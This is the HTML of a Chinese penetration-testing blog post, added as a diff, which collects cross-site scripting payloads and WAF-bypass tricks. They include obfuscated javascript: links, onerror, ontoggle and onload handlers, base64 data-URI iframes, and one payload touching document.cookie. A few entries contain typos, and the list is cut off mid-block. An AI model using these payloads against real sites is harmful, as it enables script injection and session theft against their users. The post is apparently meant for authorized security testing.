@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="1.\u00a0如何发现xss: 不要直接打弹框payload!!!!\n先使用无害的js标签 测试是否会存在标签解析问题\u00a0然后一点点绕过waf\n几个无危害标签：\n1 2 3 4 5 6 7 8 9 10 &lt;s&gt;123 &lt;h1&gt;123&lt;/h1&gt; &lt;p&gt;123&lt;/p&gt; &lt;/tExtArEa&gt;&lt;h1&gt;123&lt;/h1&gt;# &lt;/tExtArEa&gt;&lt;s&gt;123#//--+eee &#39;&#34;&gt;&lt;/tExtArEa&gt;&lt;s&gt;123#//--+eee &lt;tExtArEa&gt;&lt;/tExtArEa&gt;这个是一个强制内部转义标签\u00a0这个标签里面包裹的一切都被视为text文本 所以大部分输入框会用这个标签进行包裹。 2.\u00a0如何绕waf: 将原本的数据包发送到repeater 然后一次次的尝试绕过\u00a0直到你所输入的内容被解析为js\n">
+<title>【渗透测试】XSS的各种打法</title>
+
+<link rel='canonical' href='http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95xss%E7%9A%84%E5%90%84%E7%A7%8D%E6%89%93%E6%B3%95/'>
+
+<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【渗透测试】XSS的各种打法">
+<meta property='og:description' content="1.\u00a0如何发现xss: 不要直接打弹框payload!!!!\n先使用无害的js标签 测试是否会存在标签解析问题\u00a0然后一点点绕过waf\n几个无危害标签：\n1 2 3 4 5 6 7 8 9 10 &lt;s&gt;123 &lt;h1&gt;123&lt;/h1&gt; &lt;p&gt;123&lt;/p&gt; &lt;/tExtArEa&gt;&lt;h1&gt;123&lt;/h1&gt;# &lt;/tExtArEa&gt;&lt;s&gt;123#//--+eee &#39;&#34;&gt;&lt;/tExtArEa&gt;&lt;s&gt;123#//--+eee &lt;tExtArEa&gt;&lt;/tExtArEa&gt;这个是一个强制内部转义标签\u00a0这个标签里面包裹的一切都被视为text文本 所以大部分输入框会用这个标签进行包裹。 2.\u00a0如何绕waf: 将原本的数据包发送到repeater 然后一次次的尝试绕过\u00a0直到你所输入的内容被解析为js\n">
+<meta property='og:url' content='http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95xss%E7%9A%84%E5%90%84%E7%A7%8D%E6%89%93%E6%B3%95/'>
+<meta property='og:site_name' content='SlimerのBlog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-03-02T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-03-02T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/121.webp' />
+<meta name="twitter:title" content="【渗透测试】XSS的各种打法">
+<meta name="twitter:description" content="1.\u00a0如何发现xss: 不要直接打弹框payload!!!!\n先使用无害的js标签 测试是否会存在标签解析问题\u00a0然后一点点绕过waf\n几个无危害标签：\n1 2 3 4 5 6 7 8 9 10 &lt;s&gt;123 &lt;h1&gt;123&lt;/h1&gt; &lt;p&gt;123&lt;/p&gt; &lt;/tExtArEa&gt;&lt;h1&gt;123&lt;/h1&gt;# &lt;/tExtArEa&gt;&lt;s&gt;123#//--+eee &#39;&#34;&gt;&lt;/tExtArEa&gt;&lt;s&gt;123#//--+eee &lt;tExtArEa&gt;&lt;/tExtArEa&gt;这个是一个强制内部转义标签\u00a0这个标签里面包裹的一切都被视为text文本 所以大部分输入框会用这个标签进行包裹。 2.\u00a0如何绕waf: 将原本的数据包发送到repeater 然后一次次的尝试绕过\u00a0直到你所输入的内容被解析为js\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/images/121.webp' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "auto");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_1bd8e8462945ae7f.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">SlimerのBlog</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/274685458?spm_id_from=333.1007.0.0'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1756871816299" class="icon" viewBox="0 0 1084 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3388" xmlns:xlink="http://www.w3.org/1999/xlink" width="271" height="256"><path d="M896.43834 165.698h-62.34l54.57-54.57c23.43-23.37 23.43-70.17 0-93.54-23.37-23.37-70.17-23.37-93.54 0l-155.88 148.17H452.17034l-155.94-148.23c-23.43-23.37-70.17-23.37-93.54 0-23.37 23.43-23.43 70.17 0 93.54l54.57 54.57h-62.34A192.983 192.983 0 0 0 0.00934 360.607v420.899c0 116.97 85.71 202.68 194.91 202.68h693.75a192.983 192.983 0 0 0 194.85-194.85v-428.73c7.83-109.14-77.94-194.91-187.08-194.91z m54.63 615.809a69.869 69.869 0 0 1-70.17 70.17h-678.27a69.869 69.869 0 0 1-70.109-70.17v-413.13a69.869 69.869 0 0 1 70.17-70.17h678.21a69.869 69.869 0 0 1 70.17 70.17v413.19z m-608.039-342.96a69.869 69.869 0 0 0-70.23 70.17v70.17a69.869 69.869 0 0 0 70.17 70.17 69.869 69.869 0 0 0 70.23-70.17v-70.17a69.869 69.869 0 0 0-70.23-70.17z m405.36 0a69.869 69.869 0 0 0-70.23 70.17v70.17a69.869 69.869 0 0 0 70.17 70.17 69.869 69.869 0 0 0 70.23-70.17v-70.17a69.869 69.869 0 0 0-70.17-70.17z" p-id="3389" fill="#d4237a"></path></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/SSlimes'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1756871620871" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9490" xmlns:xlink="http://www.w3.org/1999/xlink" width="256" height="256"><path d="M682.215454 981.446137c-25.532318 0-42.553863-17.021545-42.553864-42.553864v-165.960067c4.255386-34.043091-8.510773-59.575409-29.787704-80.852341-12.766159-12.766159-17.021545-29.787704-8.510773-42.553864 4.255386-17.021545 21.276932-25.532318 34.043091-29.787704 123.406204-12.766159 238.301635-55.320023 238.301635-255.323181 0-46.80925-17.021545-93.6185-51.064636-131.916976-12.766159-12.766159-12.766159-29.787704-8.510772-42.553864 12.766159-34.043091 12.766159-68.086182 4.255386-102.129272-21.276932 4.255386-55.320023 17.021545-110.640045 55.320022-8.510773 8.510773-21.276932 8.510773-34.043091 4.255387-89.363113-25.532318-187.236999-25.532318-276.600112 0-12.766159 4.255386-25.532318 4.255386-38.298477-4.255387C307.741455 104.836549 269.442978 92.07039 248.166047 87.815004c-8.510773 34.043091-8.510773 68.086182 4.255386 102.129272 4.255386 17.021545 4.255386 34.043091-8.510773 42.553864-34.043091 38.298477-51.064636 85.107727-51.064636 131.916976 0 200.003158 114.895431 242.557022 238.301635 255.323181 17.021545 0 29.787704 12.766159 34.043091 29.787704 4.255386 17.021545 0 34.043091-8.510773 42.553864-21.276932 21.276932-29.787704 46.80925-29.787704 76.596954v165.960068c0 25.532318-17.021545 42.553863-42.553863 42.553863s-42.553863-17.021545-42.553864-42.553863v-72.341568c-127.66159 21.276932-182.981613-51.064636-221.28009-97.873886-17.021545-21.276932-29.787704-38.298477-46.80925-42.553864-21.276932-4.255386-38.298477-29.787704-29.787704-51.064636 4.255386-21.276932 29.787704-38.298477 51.064636-29.787704 42.553863 12.766159 68.086182 42.553863 93.6185 72.341568 34.043091 46.80925 63.830795 80.852341 153.193908 63.830795v-4.255386c0-25.532318 4.255386-55.320023 12.766159-76.596955-119.150818-25.532318-246.812408-102.129272-246.812408-327.664748 0-63.830795 21.276932-123.406204 59.575409-170.215454-17.021545-59.575409-12.766159-114.895431 12.766159-170.215454 4.255386-12.766159 12.766159-21.276932 25.532318-25.532318 17.021545-4.255386 72.341568-12.766159 187.236999 59.575409 93.6185-21.276932 191.492386-21.276932 280.855499 0 110.640045-72.341568 170.215454-63.830795 187.236999-59.575409 12.766159 4.255386 21.276932 12.766159 25.532319 25.532318 21.276932 55.320023 25.532318 110.640045 12.766159 165.960067 38.298477 46.80925 59.575409 106.384659 59.575408 170.215454 0 242.557022-144.683136 306.387817-246.812408 331.920135 8.510773 25.532318 12.766159 55.320023 12.766159 80.852341V938.892273c0 25.532318-17.021545 42.553863-42.553863 42.553864z" p-id="9491" fill="#d4237a"></path></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页 | Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E-about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于 | About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索 | Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5-links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接 | Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1如何发现xss">1. 如何发现xss:</a></li>
+    <li><a href="#2如何绕waf">2. 如何绕waf:</a></li>
+    <li><a href="#3各种小知识">3. 各种小知识：</a></li>
+    <li><a href="#4-几个收集的xss">4. 几个收集的xss</a></li>
+    <li><a href="#5pdfxss低-无危害">5. pdfxss:低-无危害</a></li>
+    <li><a href="#6htmlxss中-低危">6. htmlxss:中-低危</a></li>
+    <li><a href="#7svgxss中-低危">7. svgxss:中-低危</a></li>
+    <li><a href="#8其他xss">8. 其他xss:</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95xss%E7%9A%84%E5%90%84%E7%A7%8D%E6%89%93%E6%B3%95/">
+                
+                    <img src="/images/121.webp" loading="lazy" alt="Featured image of post 【渗透测试】XSS的各种打法" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #1d3557; color: #f1faee;">
+                渗透测试
+            </a>
+        
+		
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95xss%E7%9A%84%E5%90%84%E7%A7%8D%E6%89%93%E6%B3%95/">【渗透测试】XSS的各种打法</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+	
+    
+	
+    <footer class="article-time">
+        
+            <div>
+                <time class="article-time--published">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>2026年03月02日</time>
+                <span class="article-word-count">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
+                    文章共1968字
+                </span>
+            </div>
+			
+        
+
+        
+    </footer>
+    
+
+    
+	
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="1如何发现xss">1. 如何发现xss:</h1>
+<p>不要直接打弹框payload!!!!<br>
+先使用无害的js标签 测试是否会存在标签解析问题 <br>
+然后一点点绕过waf<br>
+几个无危害标签：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">s</span><span class="o">&gt;</span><span class="mi">123</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="mi">123</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="mi">123</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">tExtArEa</span><span class="o">&gt;&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="mi">123</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span><span class="c1">#
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;/</span><span class="nx">tExtArEa</span><span class="o">&gt;&lt;</span><span class="nx">s</span><span class="o">&gt;</span><span class="mi">123</span><span class="c1">#//--+eee
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">&#39;</span><span class="s2">&#34;&gt;&lt;/tExtArEa&gt;&lt;s&gt;123#//--+eee
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;tExtArEa&gt;&lt;/tExtArEa&gt;这个是一个强制内部转义标签 
+</span></span></span><span class="line"><span class="cl"><span class="s2">这个标签里面包裹的一切都被视为text文本
+</span></span></span><span class="line"><span class="cl"><span class="s2">所以大部分输入框会用这个标签进行包裹。
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="2如何绕waf">2. 如何绕waf:</h1>
+<p>将原本的数据包发送到repeater  <br>
+然后一次次的尝试绕过 <br>
+直到你所输入的内容被解析为js</p>
+<h1 id="3各种小知识">3. 各种小知识：</h1>
+<h2 id="乱码问题">乱码问题：</h2>
+<p>改成楷体 14字号 基本解决所有问题。</p>
+<h2 id="get参数">get参数：</h2>
+<p>get不能解析空格和一些特殊符号<br>
+要使用urlencode<br>
+或者把空格更改为+等</p>
+<h2 id="返回字体">返回字体：</h2>
+<p>返回的彩色字体是js<br>
+返回的正常字体是文本</p>
+<h2 id="几个弹框函数">几个弹框函数：</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">alert(1)
+</span></span><span class="line"><span class="cl">prompt(1)
+</span></span><span class="line"><span class="cl">confirm(1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="单引号相关">单引号相关：</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.数字一般都可以不带单引号
+</span></span><span class="line"><span class="cl">2.可以使用`` 或者//进行代替
+</span></span><span class="line"><span class="cl">alert(/1/)
+</span></span><span class="line"><span class="cl">alert(`1`)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="括号相关">括号相关：</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">可以使用``进行代替
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="4-几个收集的xss">4. 几个收集的xss</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;/tExtArEa&gt;&#39;&#34;&lt;a/href=&#34;ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Tab;:%26Tab;%26Tab;top%26Tab; [8680439. . (30)] ()&#34;&gt;click_me&lt;/a&gt;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">`&lt;div class=\&#34;media-wrap image-wrap\&#34;&gt;&lt;img``src=\&#34;https://img.threatbook.cn/c375eed802260503b4cee1086ea65f0e172480015227cf81a82d77.png\&#34;```onerror=\&#34;alert`1`\&#34;/&gt;&lt;/div&gt;``
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">$</span><span class="mi">20</span><span class="n">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span><span class="o">&gt;%</span><span class="mi">20</span><span class="k">var</span><span class="o">%</span><span class="mi">20</span><span class="n">reg</span><span class="o">%</span><span class="mi">20</span><span class="o">=%</span><span class="mi">20</span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="k">var</span><span class="o">%</span><span class="mi">20</span><span class="nb">str</span><span class="o">%</span><span class="mi">20</span><span class="o">=%</span><span class="mi">20</span><span class="o">%</span><span class="mi">27</span><span class="n">testString</span><span class="o">%</span><span class="mi">27</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="k">var</span><span class="o">%</span><span class="mi">20</span><span class="n">result</span><span class="o">%</span><span class="mi">20</span><span class="o">=%</span><span class="mi">20</span><span class="n">reg</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span><span class="o">%</span><span class="mi">20</span><span class="n">alert</span><span class="p">(</span><span class="n">result</span><span class="p">);</span><span class="o">%</span><span class="mi">20</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;iframe src=&#34;data:text/html;base64,PFNDcmlwdD5hbGVydCgxKTwvU0NyaXB0Pg==&#34;&gt;&lt;/iframe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>解码之后是这个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;SCript&gt;alert(1)&lt;/SCript&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;iframe src=&#34;data:text/html;base64,PG9iamVjdCBkYXRhPWRhdGE6dGV4dC9odG1sO2Jhc2U2NCxQSE5qY21sd2RENWhiR1Z5ZENnbmVITnpKeWs4TDNOamNtbHdkRDQ9Pjwvb2JqZWN0Pg==&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>几个冷门的xss:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&gt;&lt;s&gt;123456@.qqcom 邮箱xss  </span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">sTylE</span> <span class="n">OnloAd</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dETAILS</span><span class="o">%</span><span class="mi">0</span><span class="n">Aopen</span><span class="o">%</span><span class="mi">0</span><span class="n">AonToGgle</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">=%</span><span class="mi">0</span><span class="n">Aa</span><span class="o">=</span><span class="n">prompt</span><span class="p">,</span><span class="n">a</span><span class="p">()</span><span class="o">$</span><span class="mi">20</span><span class="n">x</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dETAILS</span><span class="o">%</span><span class="mi">0</span><span class="n">Aopen</span><span class="o">%</span><span class="mi">0</span><span class="n">AonToGgle</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">=%</span><span class="mi">0</span><span class="n">Aa</span><span class="o">=</span><span class="n">confirm</span><span class="p">,</span><span class="n">a</span><span class="p">()</span><span class="o">$</span><span class="mi">20</span><span class="n">x</span><span class="o">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dETAILS</span><span class="o">%</span><span class="n">OAopen</span><span class="o">&amp;</span><span class="n">OAonToGgle</span><span class="o">*</span><span class="n">OA</span><span class="o">=&amp;</span><span class="mi">0</span><span class="n">Aa</span><span class="o">=</span><span class="n">confirm</span><span class="p">,</span><span class="n">a</span><span class="p">(</span><span class="n">document</span><span class="o">.</span><span class="n">cookie</span><span class="err">）</span><span class="o">%</span><span class="mi">20</span><span class="n">x</span><span class="o">&gt;</span>  
